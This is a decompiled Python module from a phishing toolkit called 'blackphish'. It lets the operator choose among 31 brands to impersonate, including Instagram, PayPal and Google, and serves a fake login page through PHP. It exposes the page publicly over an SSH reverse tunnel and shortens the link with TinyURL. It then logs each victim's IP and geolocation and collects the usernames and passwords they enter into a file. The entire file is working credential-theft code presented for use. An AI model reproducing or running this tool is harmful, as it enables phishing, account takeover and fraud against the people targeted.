# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 3.10.6 (main, Aug  3 2022, 17:39:45) [GCC 12.1.1 20220730]
# Embedded file name: /data/data/com.termux/files/home/blackphish/files/template.py
# Compiled at: 2020-04-12 01:48:18
from files.startup import *

def csite():
    site_map = {
        '1': 'instagram',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'twitter',
        '5': 'github',
        '6': 'google',
        '7': 'spotify',
        '8': 'netflix',
        '9': 'paypal',
        '10': 'origin',
        '11': 'steam',
        '12': 'yahoo',
        '13': 'linkedin',
        '14': 'protonmail',
        '15': 'wordpress',
        '16': 'microsoft',
        '17': 'instafollowers',
        '18': 'pinterest',
        '19': 'cryptocurrency',
        '20': 'verizon',
        '21': 'dropbox',
        '22': 'adobe',
        '23': 'shopify',
        '24': 'messenger',
        '25': 'gitlab',
        '26': 'twitch',
        '27': 'myspace',
        '28': 'badoo',
        '29': 'vk',
        '30': 'yandex',
        '31': 'devianart',
    }
    user_input = input(red + 'Website ' + yellow + '>' + green)
    if user_input in site_map:
        template(site_map[user_input])
    elif user_input == '0':
        mm()
    else:
        print('wrong input!')
        csite()

def template(site_name):
    import os
    port = int(input('\x1b[92mPort: \x1b[93m'))
    os.system('clear')
    os.system(
        f'cd templates/{site_name}/;rm -rf .newvic .scammed ip.txt usernames.txt>/dev/null ;php -S 127.0.0.1:{port} 2> /dev/null >.php.log &'
    )
    slow(
        f'Starting PHP Server on {red}http://127.0.0.1:{port}\n', 0.01
    )
    os.popen(
        f'ssh  -o StrictHostKeyChecking=no -R 80:localhost:{port} d4rkgeek8@ssh.localhost.run 2> /dev/null > .log '
    )
    os.system('sleep 10')
    link1 = os.popen('cat .log|cut -d " " -f3').read()
    link2 = os.popen('cat .log|cut -d " " -f5').read()
    short_link = os.popen(
        f'curl -s http://tinyurl.com/api-create.php\\?url={link2}'
    ).read()
    print(f"{red}Original link1:{green}{link1}\n\r")
    print(f"{red}Original link2:{green}{link2}\n\r")
    print(f"{red}Shorted link:{green}{short_link}\n")
    slow('\n\rWaiting for the Victim.....\r\nHappy Hunting ;)\r\n', 0.1)

    while True:
        try:
            with open(f'templates/{site_name}/.newvic') as f:
                print('\r\nNew Victim XD:\n')
                ip = os.popen(
                    f"grep -a 'IP:' templates/{site_name}/ip.txt | cut -d \" \" -f2 | tr -d '\\r'"
                ).read()
                ip_info = os.popen(
                    f'curl -s https://ipapi.co/{ip.replace(chr(10), "")}/json'
                ).read()
                ip_info_fmt = (
                    ip_info.replace(':', ':\x1b[1;92m')
                    .replace('\n', '\n\x1b[1;91m')
                    .replace('"', '')
                    .replace('{', '')
                    .replace('}', '')
                    .replace('\n', '\n\r')
                )
                user_agent = os.popen(
                    f"grep -a 'User-Agent:' templates/{site_name}/ip.txt | cut -d '\"' -f2 | tr -d '\\r'"
                ).read()
                slow(f"{red}\rIP:{green}{ip}\n", 0.05)
                slow(f"{red}\rUser-Agent:{green}{user_agent}\n\r", 0.05)
                slow(f"{green}\rFootPrinting the IP....\n\r", 0.1)
                slow(f"\r{ip_info_fmt}\n\r", 0.025)
                with open('savedIPs.txt', 'a+') as ip_file:
                    ip_file.write(f'Scam:{site_name}\n{ip_info_fmt}')
                slow(f"{green}\n\rSaved IPs in{yellow} savedIPs.txt\n\r", 0.05)
        except IOError:
            slow('Waiting For Login Data ...\r', 0.1)
            continue

        try:
            with open(f'templates/{site_name}/.scammed') as f:
                username = os.popen(
                    f"grep -o 'Account:.*' templates/{site_name}/usernames.txt | cut -d \" \" -f2"
                ).read()
                password = os.popen(
                    f"grep -o 'Pass:.*' templates/{site_name}/usernames.txt | cut -d \":\" -f2"
                ).read()
                slow('\nLogin Data is :\n\r', 0.05)
                slow(f"\n\r{red}Account: {green}{username}", 0.05)
                slow(f"\n\r{red}Pass:{green}{password}", 0.05)
                with open('savedAccounts.txt', 'a+') as acc_file:
                    acc_file.write(
                        f'Scam:{site_name}\nAccount: {username}\nPassword:{password}'
                    )
                slow(
                    f"{green}\n\rSaved Data in{yellow} savedAccounts.txt\n\r", 0.05
                )
        except IOError:
            slow('Waiting ...\r', 0.1)
            continue
        break

    exit(0)
